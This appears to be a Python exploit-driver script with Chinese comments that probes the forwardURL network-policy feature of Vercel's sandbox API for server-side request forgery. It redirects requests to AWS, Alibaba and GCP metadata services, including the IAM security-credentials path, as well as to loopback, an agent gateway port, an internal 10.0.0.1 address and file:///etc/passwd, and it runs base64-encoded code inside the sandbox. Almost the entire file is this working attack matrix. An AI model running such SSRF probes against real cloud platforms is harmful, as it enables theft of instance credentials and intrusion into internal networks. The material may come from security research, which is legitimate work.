# 实验E4驱动: forwardURL SSRF 深度矩阵(逐轮 update + 沙箱请求)
# 轮次: IMDS http / IMDS 凭据 / 回环 / agent端口 / 内网段 / file协议
import json, base64, pathlib, urllib.request, urllib.error, time

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=60):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

NAME = "expe4"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

def run_round(label, fwd_url, match_path, req_path):
    print(f"\n########## {label}: forwardURL={fwd_url} ##########", flush=True)
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
               {"allow": {"httpbin.org": [{"match": {"path": {"exact": match_path}},
                                            "forwardURL": fwd_url}]}})
    if c != 200:
        print(f"update FAILED: {c} {r[:300]}", flush=True)
        return
    print("update OK", flush=True)
    time.sleep(2)
    payload = base64.b64encode(pathlib.Path("exp_e4.py").read_bytes()).decode()
    body = {"command": "python3", "args": ["-c",
            f"import base64;exec(base64.b64decode('{payload}').decode())", req_path],
            "wait": True, "logs": True, "timeout": 45000}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"cmd: {c}", flush=True)
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:300], flush=True)

# R0 基线
run_round("R0-BASELINE", "https://httpbin.org/anything", "/latest", "/latest")
# R1 AWS IMDS http (最高价值)
run_round("R1-IMDS-HTTP", "http://169.254.169.254", "/latest", "/latest")
# R2 IMDS 凭据端点
run_round("R2-IMDS-CREDS", "http://169.254.169.254", "/latest", "latest/meta-data/iam/security-credentials/")
# R3 回环
run_round("R3-LOOPBACK", "http://127.0.0.1:26661", "/latest", "/latest")
# R4 agent 网关
run_round("R4-AGENT", "http://100.64.0.1:47076", "/latest", "/latest")
# R5 内部网段
run_round("R5-INTRANET", "http://10.0.0.1", "/latest", "/latest")
# R6 阿里云 IMDS
run_round("R6-ALI-IMDS", "http://100.100.100.200", "/latest", "/latest")
# R7 GCP metadata
run_round("R7-GCP-META", "http://metadata.google.internal", "/latest", "/latest")
# R8 https 回环
run_round("R8-LOOPBACK-HTTPS", "https://127.0.0.1:26661", "/latest", "/latest")
# R9 file 协议
run_round("R9-FILE", "file:///etc/passwd", "/latest", "/latest")

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
